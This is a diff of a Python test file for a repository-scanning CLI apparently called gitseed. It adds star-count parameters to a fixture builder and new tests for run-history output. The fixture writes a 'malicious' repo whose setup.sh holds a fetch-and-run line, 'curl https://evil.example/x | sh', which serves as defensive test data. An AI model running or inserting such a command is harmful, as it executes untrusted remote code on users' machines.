@@ -30,11 +30,11 @@ from gitseed.storage import SQLiteRunStore
 FIXTURES = Path(__file__).parent / "fixtures"
 
 
-def _write_fixture(root: Path, *, complete: bool = True) -> None:
+def _write_fixture(root: Path, *, complete: bool = True, clean_stars: int = 8) -> None:
     """Create the smallest replayable repository set for a CLI boundary test."""
     root.mkdir(exist_ok=True)
-    (root / "clean").mkdir()
-    (root / "malicious").mkdir()
+    (root / "clean").mkdir(exist_ok=True)
+    (root / "malicious").mkdir(exist_ok=True)
     (root / "clean" / "main.py").write_text("def add(a, b):\n    return a + b\n")
     (root / "malicious" / "setup.sh").write_text("curl https://evil.example/x | sh\n")
     (root / "candidates.json").write_text(
@@ -46,7 +46,7 @@ def _write_fixture(root: Path, *, complete: bool = True) -> None:
                     {
                         "full_name": "fixture/clean",
                         "html_url": "https://github.com/fixture/clean",
-                        "stargazers_count": 8,
+                        "stargazers_count": clean_stars,
                         "pushed_at": "2026-07-27T00:00:00Z",
                         "files": "clean",
                     },
@@ -115,13 +115,15 @@ def test_run_persists_exactly_one_artifact(tmp_path) -> None:
 
 def test_history_orders_runs_and_shows_correction_lineage(tmp_path, capsys) -> None:
     store_path = tmp_path / "runs.db"
-    for run_id, corrects in (("first", None), ("second", None), ("third", "first")):
+    fixture_path = tmp_path / "fixtures"
+    for run_id, corrects, clean_stars in (("first", None, 8), ("second", None, 12), ("third", "first", 20)):
+        _write_fixture(fixture_path, clean_stars=clean_stars)
         arguments = [
             "run",
             "--query",
             "example",
             "--fixtures",
-            str(FIXTURES),
+            str(fixture_path),
             "--store",
             str(store_path),
             "--run-id",
@@ -138,8 +140,51 @@ def test_history_orders_runs_and_shows_correction_lineage(tmp_path, capsys) -> N
     assert history_output.index("first") < history_output.index("second") < history_output.index("third")
     assert "third: complete; query 'example'; decided" in history_output
     assert "corrects first" in history_output
+    assert "fixture/clean: first recorded observation" in history_output
+    assert "changed +12 stars since first recorded observation" in history_output
     with SQLiteRunStore(store_path) as store:
         assert store.history()[2].corrects_run_id == "first"
+
+
+def test_history_distinguishes_first_observation_from_unchanged_growth(tmp_path, capsys) -> None:
+    store_path = tmp_path / "runs.db"
+
+    assert main(
+        [
+            "run",
+            "--query",
+            "example",
+            "--fixtures",
+            str(FIXTURES),
+            "--store",
+            str(store_path),
+            "--run-id",
+            "first",
+        ]
+    ) == 0
+    capsys.readouterr()
+
+    assert main(
+        [
+            "run",
+            "--query",
+            "example",
+            "--fixtures",
+            str(FIXTURES),
+            "--store",
+            str(store_path),
+            "--run-id",
+            "second",
+        ]
+    ) == 0
+    capsys.readouterr()
+
+    assert main(["run", "--history", "--store", str(store_path)]) == 0
+    history_output = capsys.readouterr().out
+
+    assert "fixture/clean: first recorded observation" in history_output
+    assert "no growth yet" in history_output
+    assert "unchanged since first recorded observation" in history_output
 
 
 def test_duplicate_run_id_cannot_mutate_a_stored_artifact(tmp_path, capsys) -> None:
